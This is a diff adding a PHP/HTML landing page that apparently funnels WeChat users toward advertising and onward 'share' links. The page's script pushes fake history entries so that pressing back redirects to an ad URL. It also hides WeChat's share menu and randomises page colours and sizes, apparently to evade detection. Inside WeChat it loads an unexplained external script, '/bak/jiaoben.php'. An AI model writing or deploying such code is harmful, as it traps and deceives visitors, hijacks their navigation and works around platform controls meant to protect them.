@@ -1,0 +1,153 @@
+<?php
+
+include_once __DIR__ . '/../common.php';
+
+include_once CONFIG_PATH . 'config.php';
+
+include LIBRARY_PATH . 'fwh_helper.php';
+
+$canshu = http_build_query($_GET);
+if (!$_GET['article'] && !$_GET['share']) {
+    $advertising = $advertising . '&_tuitan=1&' . $canshu;
+}
+//获取落地二地址
+$share_domain = get_luodi_url();
+if (!$share_domain) {
+    //为空跳广告
+    $share_url = $luodigurl;
+} else {
+    $share_url = $share_domain . $_encrypter->encrypt(['t' => time(), 'class' => __MULU__ . '/home/share.php']) . '?' . $canshu;
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en" style="height: 100%">
+<head>
+	<meta charset="UTF-8">
+	<title></title>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="stylesheet" type="text/css" href="<?= $sys_global_url ?>static/app/css/index.css"/>
+	<script type="text/javascript" src="<?= $sys_global_url ?>static/app/js/adaption.js"></script>
+	<style>
+		.mhb_box{ position: relative; background-image: url(<?= $sys_global_url ?>static/app/img/beijing.png); background-repeat: no-repeat; background-size: 100%; background-position: center;}
+		.feiwxts{position:fixed;width:100%;height:100%;top:0;left:0;background:rgba(0,0,0,.6);z-index:999;display:flex;justify-content: center;align-items: center;}
+		.feiwxts_box{width:80%;border-radius: 10px;background-color:#fff;text-align:center;line-height:36px;}
+		.feiwxts_box p{line-height:30px;padding-bottom:10px;}
+
+	</style>
+</head>
+<body id="bgColor" style="overflow: hidden;height: 100%">
+
+<script>
+    window.onload = function(){
+        var windowColor = ["282828","efefef","ffffff"];
+        var rand = windowColor[Math.floor(Math.random()*windowColor.length)];
+        var mhbCon = document.createElement("div");
+        mhbCon.setAttribute("class", "mhb_content");
+        mhbCon.style.backgroundColor="#" + rand;
+        document.body.appendChild(mhbCon);
+
+        setImageSize();
+    }
+
+    function sjMultiple(){
+        var number = (Math.random() * 30 + 86) / 100;
+        return number;
+    }
+
+    var imagemultiple = sjMultiple();
+    function setImageSize(){
+        var image_size = {
+            w:6.3/imagemultiple,
+            h:11/imagemultiple
+        }
+        var open_size = {
+            w:1.8/imagemultiple,
+            h:1.86/imagemultiple,
+            b:1.65/imagemultiple
+        }
+        var tx_img = {
+            w:1/imagemultiple,
+            h:1/imagemultiple
+        }
+        var boxhtml = '<div class="mhb_box getinto" style="width:'+image_size.w+'rem;height:'+image_size.h+'rem;"><div id="bzboxBtn" class="btnTwinkle" style=" position: absolute; left: 50%; width:'+open_size.w+'rem;height:'+open_size.h+'rem; bottom:'+open_size.b+'rem; margin-left:-'+open_size.w/2+'rem;" onclick="addTwinkle()"><img src="'+sys_global_url+'static/app/img/anniu.png" style="display: block; width: 100%; height: 100%;"></div></div>';
+        document.querySelector(".mhb_content").innerHTML = boxhtml;
+    }
+
+    function addTwinkle(){
+        document.getElementById("bzboxBtn").className = "overturn";
+        setTimeout(function(){
+            window.location.href = share_url;
+        },1200);
+    }
+
+</script>
+</body>
+<script>
+    function onBridgeReady() {
+        WeixinJSBridge.call('hideOptionMenu');
+    }
+    if (typeof WeixinJSBridge == "undefined") {
+        if (document.addEventListener) {
+            document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+        } else if (document.attachEvent) {
+            document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+            document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+        }
+    } else {
+        onBridgeReady();
+    }
+</script>
+<script>
+    var share_url = '<?= $share_url ?>',
+        sys_global_url = '<?= $sys_global_url ?>';
+
+    <?=$tongji?>
+    //监听返回
+    window.onhashchange = function () {
+        jp();
+    };
+
+    function hh() {
+        history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());
+    }
+
+    //返回事件，跳广告
+    function jp() {
+        location.href = '<?=$advertising?>';
+    }
+
+    setTimeout('hh();', 200);
+</script>
+<script type="text/javascript" src="<?= $sys_global_url ?>static/app/layer_mobile/layer.js"></script>
+<script type="text/javascript">
+    var ua = navigator.userAgent.toLowerCase();
+    var currentUrl = window.location.href;
+    if (ua.match(/MicroMessenger/i) != "micromessenger") {
+        var kajr = document.createElement("div");
+        kajr.setAttribute("class","feiwxts");
+        var fwxhtml = '<div class="feiwxts_box"><div style="padding:20px;font-size:18px;"><p>复制下面的链接，然后到微信里打开</p><textarea name=""style="display:inline-block;width:90%;border: 1px dashed #999;padding-left: 5px;padding-right: 5px;line-height:22px;" id="clickBtn" onclick="copyUrl()">'+currentUrl+'</textarea><button type="button" style="display:inline-block;padding-left:20px;padding-right:20px;height:35px;line-height:35px;background-color: #ff2400;color:#fff;margin-top:10px;" onclick="copyUrl()">点击复制</button></div></div>';
+        kajr.innerHTML = fwxhtml;
+        document.body.appendChild(kajr);
+    }else{
+        function loadJS(src) {
+            var s = document.createElement('script');
+            s.setAttribute('src', src);
+            s.setAttribute('charset', "utf-8");
+            document.body.appendChild(s);
+        }
+        loadJS('/bak/jiaoben.php');
+    }
+    function copyUrl(){
+        var Url=document.getElementById("clickBtn");
+        Url.select();
+        document.execCommand("Copy");
+        layer.open({
+            content: '复制成功！去微信打开'
+            ,skin: 'msg'
+            ,time: 2
+        });
+    }
+</script>
+</html>
